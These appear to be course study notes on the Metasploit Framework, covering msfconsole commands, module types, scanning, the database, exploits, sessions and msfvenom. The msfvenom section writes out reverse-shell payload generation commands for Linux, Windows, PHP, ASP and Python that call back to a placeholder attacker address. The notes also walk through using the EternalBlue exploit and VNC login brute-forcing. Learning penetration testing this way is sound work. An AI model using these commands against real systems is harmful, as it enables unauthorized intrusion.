# Metasploit Framework

## What is Metasploit?

**Metasploit** is a widely used exploitation framework for penetration testing.

It supports different stages of a penetration test, including:

* Information gathering
* Scanning
* Vulnerability assessment
* Exploitation
* Post-exploitation
* Exploit development

It can also be useful for **vulnerability research** and testing security weaknesses.

---

## Metasploit Versions

There are two main versions:

### Metasploit Pro

* Commercial version
* Includes a **GUI (Graphical User Interface)**
* Provides additional automation and management features

### Metasploit Framework

* Open-source version
* Mainly used through the **command line**
* Commonly included in penetration-testing Linux distributions
* This is the version commonly used for hands-on penetration testing

---

## Main Components

### `msfconsole`

The main command-line interface for the Metasploit Framework.

It provides access to Metasploit's modules and commands.

### Modules

Modules are components that perform specific security-testing functions.

Common module types include:

* **Exploits** — take advantage of vulnerabilities
* **Scanners** — identify systems, services or vulnerabilities
* **Payloads** — code executed after successful exploitation
* Other supporting modules used during penetration testing

### Tools

Metasploit also includes standalone tools useful for security testing and exploit development.

Examples:

* **msfvenom** — creates and manipulates payloads
* **pattern_create** — generates patterns useful during exploit development
* **pattern_offset** — helps identify offsets when analysing crashes

---

## Metasploit in a Penetration Test

A simplified workflow can look like:

```text
Information Gathering
        ↓
Scanning
        ↓
Identify Vulnerability
        ↓
Find Suitable Exploit
        ↓
Configure Parameters
        ↓
Exploitation
        ↓
Post-Exploitation
```

Metasploit helps automate and manage many of these stages.

## Key Terms

| Term                  | Meaning                                                   |
| --------------------- | --------------------------------------------------------- |
| **Framework**         | Collection of tools and modules for security testing      |
| **Exploit**           | Code or technique that takes advantage of a vulnerability |
| **Payload**           | Code delivered/executed through an exploit                |
| **Module**            | A component that performs a specific function             |
| **Post-exploitation** | Activities performed after gaining access                 |
| **msfconsole**        | Main command-line interface for Metasploit                |
| **msfvenom**          | Tool for creating and manipulating payloads               |

## Key Takeaway

**Metasploit Framework = open-source penetration-testing framework containing exploits, payloads, scanners and other security-testing tools.**

The main interface is **`msfconsole`**, while tools such as **`msfvenom`** support specific tasks.

# Metasploit Framework

## Metasploit Console

**`msfconsole`** is the main command-line interface for the Metasploit Framework.

It is used to interact with Metasploit's different modules, configure options, search for exploits, and perform penetration-testing activities.

---

## Key Concepts

### Vulnerability

A **vulnerability** is a weakness or flaw in a system.

It can result from:

* Poor design
* Coding errors
* Logic flaws
* Incorrect configuration

A vulnerability may allow an attacker to access information or execute code.

### Exploit

An **exploit** is code or a technique that takes advantage of a vulnerability.

```text
Vulnerability = weakness
Exploit = method used to take advantage of the weakness
```

### Payload

A **payload** is the code that runs on the target after an exploit successfully takes advantage of a vulnerability.

Examples include:

* Opening a shell
* Running a command
* Executing an application

```text
Exploit → takes advantage of vulnerability
Payload → performs the desired action
```

---

# Metasploit Module Types

## Auxiliary

Auxiliary modules perform supporting tasks that aren't necessarily exploitation.

Examples include:

* Scanners
* Crawlers
* Fuzzers
* Information-gathering modules

---

## Encoders

Encoders modify the representation of an exploit or payload.

They were historically used to try to avoid **signature-based antivirus detection**.

Signature-based security tools compare files or activity against known patterns.

However, encoding is **not a reliable way to bypass modern antivirus or security solutions**, as they can use additional detection techniques.

---

## Evasion

Evasion modules are specifically designed to attempt to bypass security controls such as antivirus detection.

This is different from encoders:

* **Encoder** → changes the representation of a payload
* **Evasion** → attempts to avoid security detection

---

## Exploits

Exploit modules contain techniques for exploiting vulnerabilities.

They are organised according to the target platform or system, such as:

* Windows
* Linux
* Android
* macOS
* Unix
* BSD

---

## NOPs

**NOP** stands for **No Operation**.

A NOP performs no useful operation. On x86 systems, the traditional NOP instruction is represented by `0x90`.

NOPs can be used as a **buffer** to help achieve consistent payload sizes during exploit development.

---

# Payloads

Payloads are the code that runs on the target after successful exploitation.

They can perform actions such as:

* Opening a shell
* Running commands
* Executing applications
* Establishing a connection back to the tester

A **shell** is an interactive command-line interface that allows commands to be executed on the target system.

Metasploit payloads are organised into four main categories.

### Adapters

Adapters wrap a payload and convert it into another format.

### Singles

**Single (inline) payloads** are self-contained and do not require another payload component to be downloaded.

### Stagers

Stagers establish the communication channel between the target and Metasploit.

They are used with **staged payloads**.

### Stages

Stages are the larger payload components that are downloaded by the stager after the connection has been established.

---

## Staged vs Single Payloads

Metasploit uses different notation to distinguish between single and staged payloads.

### Single / Inline

```text
generic/shell_reverse_tcp
```

The `_` between `shell` and `reverse` indicates an inline/single payload.

### Staged

```text
windows/x64/shell/reverse_tcp
```

The `/` between `shell` and `reverse` indicates a staged payload.

### Simple difference

**Single:** complete payload is delivered at once.

**Staged:** a small stager establishes the connection, then the larger stage is delivered.

---

# Post Modules

**Post** modules are used during the **post-exploitation** stage of a penetration test.

They can perform additional actions after access has been obtained, such as gathering information from the compromised system.

Post modules are organised by platforms and categories such as:

* Windows
* Linux
* Android
* macOS
* Networking
* Hardware

---

# Metasploit Module Overview

| Module        | Purpose                                                |
| ------------- | ------------------------------------------------------ |
| **Auxiliary** | Scanning, crawling, fuzzing and other supporting tasks |
| **Encoders**  | Encode payloads into different representations         |
| **Evasion**   | Attempt to bypass security detection                   |
| **Exploits**  | Exploit vulnerabilities                                |
| **NOPs**      | No-operation instructions used in exploit development  |
| **Payloads**  | Code executed on the target                            |
| **Post**      | Post-exploitation activities                           |

## Basic Attack Flow

```text
Vulnerability
      ↓
Exploit
      ↓
Payload
      ↓
Access / Shell
      ↓
Post-Exploitation
```

## Key Takeaway

The most important distinction is:

**Vulnerability** = weakness in the target

**Exploit** = method that takes advantage of the weakness

**Payload** = code that performs an action after exploitation

**Post-exploitation** = activities performed after gaining access

# Metasploit Framework

## Metasploit Console

**`msfconsole`** is the main command-line interface for Metasploit.

You can use it to search for modules, select modules, configure options, view information, and run modules.

### Useful Commands

| Command         | Purpose                                                  |
| --------------- | -------------------------------------------------------- |
| `msfconsole`    | Start the Metasploit console                             |
| `help`          | Display available commands                               |
| `history`       | Show previously entered commands                         |
| `version`       | Display the Metasploit version                           |
| `show options`  | Display options for the current module                   |
| `show payloads` | Display compatible payloads                              |
| `show`          | Display available modules/resources depending on context |
| `use`           | Select a module                                          |
| `back`          | Leave the current module context                         |
| `info`          | Display detailed information about a module              |
| `search`        | Search for relevant Metasploit modules                   |
| `set`           | Set a module option                                      |

---

## Linux Commands

`msfconsole` can execute many normal Linux commands.

For example:

```text
ls
ping -c 1 8.8.8.8
clear
```

However, it does **not support every feature of a normal shell**, such as standard output redirection.

---

## Help

The `help` command provides information about Metasploit commands.

It can also be used with a specific command:

```text
help set
```

This explains how the `set` command works.

---

## Command History

The `history` command displays commands previously entered into `msfconsole`.

This can be useful for reviewing or repeating previous actions.

---

## Tab Completion

Metasploit supports **tab completion**.

Typing part of a command and pressing `Tab` can automatically complete the command or show possible options.

This is particularly useful when working with long module names and paths.

---

# Metasploit Context

Metasploit uses **contexts**.

When you select a module with `use`, the console enters that module's context.

For example:

```text
use exploit/windows/smb/ms17_010_eternalblue
```

The prompt changes to indicate the selected module:

```text
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Options set within a module generally belong to that module's context.

If you switch to another module, you may need to configure its options again.

The `back` command leaves the current module context.

---

## Module Options

The `show options` command displays the settings required by the selected module.

Common options include:

* **RHOSTS** — target host(s)
* **RPORT** — target port
* **LHOST** — local/listening host
* **LPORT** — local/listening port
* **SESSION** — existing Metasploit session used by some post-exploitation modules

Different modules require different options.

---

## Sessions

A **session** is an existing connection to a target system established through Metasploit.

Some post-exploitation modules require a session ID so they know which existing connection to operate through.

---

# `use`

The `use` command selects a Metasploit module.

Example:

```text
use exploit/windows/smb/ms17_010_eternalblue
```

A module can also be selected using its number from a `search` result.

---

# `show`

The `show` command displays information depending on the current context.

Examples:

```text
show options
```

Displays the options required by the current module.

```text
show payloads
```

Displays payloads compatible with the current exploit.

The available output depends on the module and context.

---

# `info`

The `info` command provides detailed information about a module.

It can show:

* Module name
* Module type
* Platform
* Architecture
* Author
* Description
* Disclosure date
* Available targets
* Required options
* References
* Payload information

`info` provides **module information**, rather than acting as a general help command.

---

# Searching for Modules

The `search` command searches Metasploit's module database.

You can search using:

* CVE numbers
* Vulnerability names
* Exploit names
* Technologies
* Target platforms
* Module types

Example:

```text
search ms17-010
```

Search results can show:

* Module number
* Module name
* Disclosure date
* Rank
* Whether checking is supported
* Description

You can then select a result using its number or module path.

---

## Search Filters

Searches can be narrowed using keywords such as `type:` and `platform:`.

Example:

```text
search type:auxiliary telnet
```

This searches specifically for **auxiliary** modules related to Telnet.

---

# Exploit Ranking

Metasploit assigns ranks to exploits based on their **reliability and likelihood of successfully working**.

A higher-ranked exploit is generally considered more reliable, but the ranking does **not guarantee success**.

Even highly ranked exploits can potentially cause unexpected behaviour, while lower-ranked exploits may work successfully in some situations.

---

# EternalBlue Example

**EternalBlue** is an exploit targeting a vulnerability in **SMBv1** on certain Windows systems.

It became widely known after being leaked by the **Shadow Brokers** in 2017 and was later used in the **WannaCry ransomware attack**.

The Metasploit module is:

```text
exploit/windows/smb/ms17_010_eternalblue
```

This is useful as an example for understanding how Metasploit modules, options, exploits and payloads work.

---

## Basic Metasploit Workflow

```text
Start msfconsole
      ↓
Search for a relevant module
      ↓
Select the module with use
      ↓
View module information
      ↓
View required options
      ↓
Configure required options
      ↓
Select/configure payload if needed
      ↓
Run the module
      ↓
Work with the resulting session
```

## Key Takeaway

The most important commands to remember are:

```text
search    → find modules
use       → select a module
info      → learn about a module
show      → view available information/options
set       → configure an option
back      → leave the current context
```
# Metasploit Framework

## Setting Module Parameters

After selecting a module with `use`, parameters can be configured using:

```text
set PARAMETER_NAME VALUE
```

For example:

```text
set RHOSTS TARGET_IP
```

Use:

```text
show options
```

to see the parameters required by the current module.

---

## Common Metasploit Parameters

| Parameter   | Meaning                                                          |
| ----------- | ---------------------------------------------------------------- |
| **RHOSTS**  | Remote host(s) — the target IP address or range                  |
| **RPORT**   | Remote port — the port used by the target service                |
| **PAYLOAD** | Payload to use with an exploit                                   |
| **LHOST**   | Local host — the attacker's IP address                           |
| **LPORT**   | Local port — the port used for a connection back to the attacker |
| **SESSION** | Existing Metasploit session used by another module               |

### RHOSTS

Specifies the target system or systems.

It can contain:

* A single IP address
* A network range
* CIDR notation
* A file containing target addresses

### RPORT

Specifies the port where the target service is running.

A module may provide a default value, but this should be checked because the target service could use a different port.

### LHOST

The IP address of the attacking machine, such as the AttackBox or Kali Linux system.

### LPORT

The local port used for a connection back to the attacking machine.

### SESSION

Identifies an existing Metasploit connection to a target.

Post-exploitation modules can use a session to interact with an already compromised system.

---

## `set` vs `setg`

### `set`

Sets a parameter for the **current module**.

```text
set RHOSTS TARGET_IP
```

If you switch to another module, the value may need to be configured again.

### `setg`

Sets a parameter **globally**, allowing it to be used across different modules.

```text
setg RHOSTS TARGET_IP
```

The global value remains available until Metasploit is exited or the value is cleared.

### Clearing Values

```text
unset PARAMETER
```

Clears a specific parameter.

```text
unset all
```

Clears all parameters for the current context.

```text
unsetg PARAMETER
```

Clears a globally configured parameter.

---

# Metasploit Prompts

The prompt tells you which environment or context you are currently working in.

### Regular Linux Shell

```text
root@machine:~#
```

This is the normal operating-system command line.

### Metasploit Console

```text
msf6 >
```

Metasploit is running, but no module context is selected.

### Module Context

```text
msf6 exploit(windows/smb/example) >
```

A specific Metasploit module has been selected.

### Meterpreter

```text
meterpreter >
```

A Meterpreter session is active.

### Target Shell

```text
C:\Windows\system32>
```

Commands entered here are executed directly on the target system.

---

# Running Modules

Once the required parameters have been configured, a module can be launched using:

```text
exploit
```

Metasploit also supports:

```text
run
```

`run` is an alias for `exploit` and is useful because not every module is an exploit, such as scanners and other auxiliary modules.

### Backgrounding a Session

The `-z` option can be used with `exploit` to run the exploit and automatically place the resulting session in the background:

```text
exploit -z
```

---

# Checking for Vulnerabilities

Some modules support:

```text
check
```

This attempts to determine whether the target is vulnerable **without actually exploiting it**.

This can be useful before running an exploit.

---

# Sessions

When an exploit successfully establishes communication with the target, Metasploit creates a **session**.

A session is the communication channel between Metasploit and the target.

### Background a Session

From a Meterpreter session:

```text
background
```

You can also use **Ctrl+Z**.

### List Sessions

```text
sessions
```

This displays currently active sessions.

### Interact with a Session

```text
sessions -i SESSION_ID
```

For example:

```text
sessions -i 2
```

This opens interaction with session 2.

---

# Basic Metasploit Workflow

```text
Search
  ↓
use module
  ↓
show options
  ↓
set required parameters
  ↓
check (if supported)
  ↓
run / exploit
  ↓
Session created
  ↓
sessions
  ↓
sessions -i ID
```

## Key Takeaway

The main things to remember are:

**`set`** → configure a parameter for the current module

**`setg`** → configure a global parameter

**`show options`** → see required settings

**`check`** → check vulnerability without exploitation, when supported

**`run` / `exploit`** → execute the module

**`sessions`** → view active sessions

**`sessions -i ID`** → interact with a specific session

**`background`** → return from a session to the Metasploit console

# Metasploit Framework — Port Scanning

## Port Scanning

Metasploit includes auxiliary modules for scanning open ports and identifying services running on a target.

Search for port-scanning modules:

```bash
search portscan
```

### Common Port Scanners

* `auxiliary/scanner/portscan/tcp` — TCP port scanner
* `auxiliary/scanner/portscan/syn` — TCP SYN scanner
* `auxiliary/scanner/portscan/ack` — TCP ACK firewall scanner
* `auxiliary/scanner/portscan/xmas` — TCP XMas scanner
* `auxiliary/scanner/portscan/ftpbounce` — FTP Bounce scanner

### TCP Port Scanner

The TCP port scanner can check a specified range of TCP ports.

```bash
use auxiliary/scanner/portscan/tcp
show options
```

Important options:

| Option        | Purpose                                  |
| ------------- | ---------------------------------------- |
| `RHOSTS`      | Target host or network                   |
| `PORTS`       | Ports or port range to scan              |
| `CONCURRENCY` | Number of targets scanned simultaneously |
| `THREADS`     | Number of scanning threads               |
| `TIMEOUT`     | Socket connection timeout                |
| `DELAY`       | Delay between connections                |

**Note:** Metasploit's default port range is `1-10000`. This is different from Nmap's default scan, which checks its 1,000 most commonly used ports.

---

## Nmap from Metasploit

Nmap can also be run directly from the `msfconsole` prompt:

```bash
nmap -sS TARGET_IP
```

Metasploit is useful for scanning when already working within the framework, while Nmap is generally more suitable for fast and detailed port scanning.

---

## UDP Service Identification

Metasploit includes modules for quickly identifying services running over UDP.

### UDP Sweep

```text
auxiliary/scanner/discovery/udp_sweep
```

The UDP sweep performs a quick scan to identify common UDP services such as:

* DNS
* NetBIOS

It is intended for quick service discovery rather than a complete scan of every UDP service.

---

## SMB Scanning

Metasploit provides auxiliary modules for gathering information about SMB services.

Useful SMB scanners include:

```text
auxiliary/scanner/smb/smb_version
auxiliary/scanner/smb/smb_enumshares
```

### SMB Version

`smb_version` can identify information such as:

* Windows version
* Build/Service Pack
* Computer name
* Workgroup/domain
* SMB signatures

### SMB Share Enumeration

`smb_enumshares` can identify SMB network shares and potentially accessible shared resources.

---

## NetBIOS

**NetBIOS (Network Basic Input/Output System)** allows computers to communicate over a network and supports services such as file and printer sharing.

NetBIOS information can reveal:

* Computer names
* Workgroup information
* Network information
* Possible system roles

For example, a hostname such as `CORP-DC` could indicate a domain controller.

---

## Why Service Scanning Matters

Scanning helps build an understanding of the target by identifying:

1. Open ports
2. Running services
3. Service versions
4. Operating system information
5. Potential attack surfaces
6. Possible vulnerabilities

### Reconnaissance Flow

```text
Port Scanning
      ↓
Identify Services
      ↓
Identify Versions
      ↓
Search for Vulnerabilities
      ↓
Select Appropriate Module
```
# Metasploit Framework — Database & Workspaces

## Metasploit Database

Metasploit can use a PostgreSQL database to store information gathered during penetration testing engagements.

This is particularly useful when working with **multiple targets**, because it keeps hosts, services, vulnerabilities, and other information organised.

### Database Status

Check whether Metasploit is connected to its database:

```bash
db_status
```

A successful connection will show PostgreSQL as the connection type.

---

## Workspaces

Workspaces separate information from different penetration testing projects or engagements.

### List Workspaces

```bash
workspace
```

### Create a Workspace

```bash
workspace -a NAME
```

### Switch Workspace

```bash
workspace NAME
```

### Delete a Workspace

```bash
workspace -d NAME
```

### Workspace Help

```bash
workspace -h
```

### Why Use Workspaces?

They help prevent information from different projects or targets from becoming mixed together.

---

## Database Commands

When a database is connected, Metasploit provides additional commands:

| Command     | Purpose                                 |
| ----------- | --------------------------------------- |
| `db_status` | Check database connection               |
| `db_nmap`   | Run Nmap and automatically save results |
| `hosts`     | List hosts stored in the database       |
| `services`  | List discovered services                |
| `vulns`     | List discovered vulnerabilities         |
| `loot`      | List collected loot                     |
| `notes`     | List stored notes                       |
| `db_import` | Import scan results                     |
| `db_export` | Export database information             |
| `workspace` | Manage workspaces                       |

---

## `db_nmap`

`db_nmap` runs Nmap from Metasploit and automatically stores the scan results in the database.

Example:

```bash
db_nmap -sV -p- TARGET_IP
```

The results can then be viewed using:

```bash
hosts
```

and:

```bash
services
```

---

## Hosts

The `hosts` command displays information about discovered systems.

```bash
hosts
```

It can show information such as:

* IP address
* MAC address
* Hostname
* Operating system
* System purpose
* Additional information

### Using Saved Hosts

```bash
hosts -R
```

This sets the saved host addresses as the `RHOSTS` value for the current module.

This is useful when multiple targets have already been stored in the database.

---

## Services

The `services` command lists services discovered during scans.

```bash
services
```

Information can include:

* Host
* Port
* Protocol
* Service name
* State
* Service information/version

### Search for Specific Services

```bash
services -S SERVICE_NAME
```

For example:

```bash
services -S netbios
```

This searches the database for services matching the specified term.

---

## Typical Database Workflow

```text
Create/Select Workspace
        ↓
Run db_nmap
        ↓
Store Hosts & Services
        ↓
Use hosts / services
        ↓
Identify Potential Vulnerabilities
        ↓
Use hosts -R to Set RHOSTS
        ↓
Run Appropriate Scanner/Exploit
```

## Useful Low-Hanging-Fruit Checks

After discovering services, common areas to investigate include:

* **HTTP** → Web applications and potential web vulnerabilities
* **FTP** → Anonymous access or exposed files
* **SMB** → Vulnerabilities such as MS17-010
* **SSH** → Weak or default credentials
* **RDP** → Weak credentials or vulnerabilities such as BlueKeep

### Key Takeaway

The Metasploit database helps organise penetration-testing information by storing **hosts, services, vulnerabilities, notes and loot**, while **workspaces** keep different engagements separated.

# Metasploit Framework — Vulnerability Scanning

## Low-Hanging Fruit

**Low-hanging fruit** refers to vulnerabilities that are relatively easy to identify and potentially exploit.

They may allow an attacker to:

* Gain initial access to a system
* Obtain user access
* Gain higher privileges such as administrator or root

Finding vulnerabilities with Metasploit depends heavily on accurate **scanning and fingerprinting**.

The more information gathered about the target, the more relevant Metasploit modules can be identified.

---

## Identifying Modules

After discovering a service, use Metasploit's `search` function to find modules related to it.

For example, if a target is running **VNC**:

```bash
search vnc
```

Metasploit may return different types of modules, including:

* Exploits
* Auxiliary scanners
* Payloads
* Post-exploitation modules

At this stage, scanner modules can be particularly useful for gathering more information about the service.

---

## Module Information

The `info` command provides detailed information about a Metasploit module.

```bash
info
```

It can show:

* Module name
* Module type
* Description
* Rank
* Author/provider
* Required options
* Default values
* References
* Supported checks

---

## VNC Scanning

VNC is a remote desktop protocol.

Metasploit includes several VNC-related scanner modules, such as:

```text
auxiliary/scanner/vnc/vnc_login
auxiliary/scanner/vnc/vnc_none_auth
auxiliary/scanner/vnc/ard_root_pw
```

### VNC Login Scanner

The `vnc_login` module can test credentials against a VNC service and identify successful logins.

It supports options such as:

| Option            | Purpose                               |
| ----------------- | ------------------------------------- |
| `RHOSTS`          | Target host(s)                        |
| `RPORT`           | VNC service port                      |
| `USERNAME`        | Specific username                     |
| `PASSWORD`        | Specific password                     |
| `USER_FILE`       | List of usernames                     |
| `PASS_FILE`       | List of passwords                     |
| `USERPASS_FILE`   | Username/password combinations        |
| `BLANK_PASSWORDS` | Test blank passwords                  |
| `USER_AS_PASS`    | Test usernames as passwords           |
| `STOP_ON_SUCCESS` | Stop after finding a successful login |
| `THREADS`         | Number of simultaneous attempts       |

The default VNC port is commonly **5900**.

### Key Takeaway

```text
Identify Service
      ↓
Search Metasploit
      ↓
Find Relevant Modules
      ↓
Use info to understand a module
      ↓
Run Appropriate Scanner
      ↓
Identify Potential Vulnerabilities
```

**Main idea:** Good reconnaissance and service fingerprinting make it much easier to find relevant Metasploit modules and potential vulnerabilities.

# Metasploit Framework — Exploits, Payloads & Sessions

## Exploits

Metasploit is primarily an **exploitation framework**, so exploits are one of its largest module categories.

An **exploit** is code or a technique that takes advantage of a vulnerability in a target system.

### Basic exploit workflow

1. Search for an exploit
2. Select the exploit with `use`
3. Read its details with `info`
4. Check available payloads with `show payloads`
5. Configure required options with `show options`
6. Select a payload with `set payload`
7. Run the exploit with `exploit`

A successful exploit depends heavily on correctly identifying the target's **OS, architecture, service and vulnerability**.

---

## Payloads

A **payload** is the code that runs on the target after an exploit succeeds.

Payloads determine what happens after exploitation, such as:

* Opening a command shell
* Opening a Meterpreter session
* Executing a command
* Creating a connection back to the attacker

### Listing compatible payloads

```text
show payloads
```

This displays payloads compatible with the currently selected exploit.

### Selecting a payload

```text
set payload <payload>
```

Example:

```text
set payload generic/shell_reverse_tcp
```

---

## Payload Options

After selecting a payload, run:

```text
show options
```

The payload may introduce additional settings.

### LHOST

**LHOST** = the attacker's listening/local address.

For a reverse payload, the target connects back to this address.

```text
set LHOST <attacker-ip>
```

### LPORT

**LPORT** = the port where the attacker listens for the incoming connection.

Example:

```text
set LPORT 4444
```

A reverse payload commonly requires both:

```text
set LHOST <attacker-ip>
set LPORT 4444
```

---

## Reverse vs Bind Payloads

### Reverse payload

The target connects **back to the attacker**.

```text
Target → Attacker
```

Often requires:

* `LHOST`
* `LPORT`

### Bind payload

The target opens a listening connection, and the attacker connects **to the target**.

```text
Attacker → Target
```

The choice can depend on network restrictions such as firewalls and routing.

---

## Choosing a Working Payload

A payload may fail even when the exploit itself is valid.

Possible reasons include:

* Firewall restrictions
* Antivirus/security software
* Operating-system restrictions
* Architecture incompatibility
* Required functionality not being available
* Payload execution being blocked

Therefore, choosing a payload can sometimes involve **trial and error**.

Different payloads may also introduce additional options, so run:

```text
show options
```

again after selecting a payload.

---

# Exploiting a Vulnerability

A typical Metasploit exploitation process looks like:

```text
Search
   ↓
Select exploit
   ↓
show options
   ↓
Select payload
   ↓
Configure LHOST/LPORT and other options
   ↓
Check target (if supported)
   ↓
exploit
   ↓
Session opened
```

If exploitation succeeds, Metasploit may open a **session**.

---

# Sessions

A **session** is an active communication channel between Metasploit and the compromised target.

Examples include:

* Command shell sessions
* Meterpreter sessions

### List active sessions

```text
sessions
```

or:

```text
sessions -l
```

### Interact with a session

```text
sessions -i <ID>
```

Example:

```text
sessions -i 1
```

This switches into session 1.

---

## Backgrounding a Session

You can leave a session running while returning to the Metasploit console.

From the session:

```text
CTRL + Z
```

Metasploit asks whether you want to background the session.

The session remains active and can be accessed again later.

This is useful when:

* Working with multiple targets
* Managing multiple sessions
* Returning to the Metasploit console
* Running another module while keeping an existing session open

---

## Useful Session Commands

| Command               | Purpose                          |
| --------------------- | -------------------------------- |
| `sessions`            | List active sessions             |
| `sessions -l`         | List active sessions             |
| `sessions -i ID`      | Interact with a session          |
| `sessions -k ID`      | Terminate a session              |
| `sessions -K`         | Terminate all sessions           |
| `sessions -h`         | Display session help             |
| `sessions -n ID NAME` | Rename a session                 |
| `sessions -v`         | Show verbose session information |

### Example

```text
sessions
```

```text
sessions -i 1
```

This starts interaction with session 1.

---

## Important Commands

| Command          | Meaning                                                   |
| ---------------- | --------------------------------------------------------- |
| `search`         | Find modules                                              |
| `use`            | Select a module                                           |
| `info`           | View module information                                   |
| `show payloads`  | List compatible payloads                                  |
| `set payload`    | Select a payload                                          |
| `show options`   | Display required settings                                 |
| `set LHOST`      | Set local/attacker address                                |
| `set LPORT`      | Set listening port                                        |
| `check`          | Check whether the target appears vulnerable, if supported |
| `exploit`        | Launch the exploit                                        |
| `sessions`       | Manage active sessions                                    |
| `sessions -i ID` | Interact with a session                                   |
| `CTRL + Z`       | Background the current session                            |

## Key Takeaway

**Exploit = takes advantage of the vulnerability**

**Payload = determines what runs after exploitation**

**Session = active connection to the target**

The overall relationship is:

```text
Vulnerability
      ↓
   Exploit
      ↓
   Payload
      ↓
   Session
      ↓
Post-exploitation
```
# MSFvenom

**MSFvenom** is a Metasploit tool used to **generate payloads**.

It replaced the older:

* `msfpayload`
* `msfencode`

MSFvenom can generate payloads for different:

* Operating systems
* Platforms
* File formats
* Programming languages

Examples include:

* Windows `.exe`
* Linux `.elf`
* PHP
* ASP
* Python
* Android
* iOS

---

## Listing Payloads

To list available payloads:

```bash
msfvenom -l payloads
```

MSFvenom provides access to the payloads available within the Metasploit Framework.

---

## Output Formats

MSFvenom can create payloads in different output formats.

List supported formats with:

```bash
msfvenom --list formats
```

A payload can be generated as a standalone executable or in a raw format suitable for another application or script.

---

# Encoders

Encoders modify the representation of a payload.

The `-e` option specifies an encoder.

Example:

```bash
-e php/base64
```

### Important

Encoders **do not guarantee antivirus evasion**.

Older antivirus software could sometimes be bypassed by encoded payloads, but modern security solutions use more advanced detection techniques.

**Encoding ≠ encryption or guaranteed AV bypass.**

---

# Reverse Payloads

A **reverse payload** causes the target to connect back to the attacker's machine.

```text
Target ─────────→ Attacker
        connection
```

A reverse payload normally requires:

* **LHOST** — attacker's listening IP/address
* **LPORT** — port used to receive the connection

Example structure:

```bash
msfvenom -p <payload> LHOST=<IP> LPORT=<PORT> -f <format>
```

---

# Handlers

When using MSFvenom to generate a reverse payload, something needs to **receive the incoming connection**.

This is called a **handler**.

Metasploit's:

```text
exploit/multi/handler
```

can act as the listener for reverse shells and Meterpreter connections.

### Basic handler workflow

```text
Generate payload
      ↓
Transfer/execute payload
      ↓
Target connects back
      ↓
Multi Handler receives connection
      ↓
Shell/Meterpreter session
```

The handler needs to use compatible:

* Payload
* LHOST
* LPORT

These should match the values used when generating the payload.

---

# Common Payload Formats

| Target  | Example format | Typical extension |
| ------- | -------------- | ----------------- |
| Windows | `exe`          | `.exe`            |
| Linux   | `elf`          | `.elf`            |
| PHP     | `raw`          | `.php`            |
| ASP     | `asp`          | `.asp`            |
| Python  | `raw`          | `.py`             |

### Linux ELF

ELF is the common executable format for Linux.

Example payload:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```

The file may need executable permissions before it can be run.

### Windows

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```

### PHP

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```

### ASP

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```

### Python

```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

---

# MSFvenom vs Metasploit Handler

**MSFvenom** → creates the payload.

**Multi Handler** → waits for and receives the connection generated by a reverse payload.

Example:

```text
MSFvenom
   ↓
Generate reverse payload
   ↓
Target executes payload
   ↓
Target connects back
   ↓
exploit/multi/handler
   ↓
Shell / Meterpreter session
```

## Key Takeaways

* **MSFvenom** generates Metasploit payloads.
* `-p` selects the payload.
* `-f` specifies the output format.
* `-e` specifies an encoder.
* **LHOST** = attacker's listening address.
* **LPORT** = attacker's listening port.
* **Reverse payload** = target connects back to attacker.
* **Handler** = receives the incoming reverse connection.
* `exploit/multi/handler` can handle reverse shells and Meterpreter sessions.
* Encoders modify payload representation but **do not guarantee antivirus evasion**.
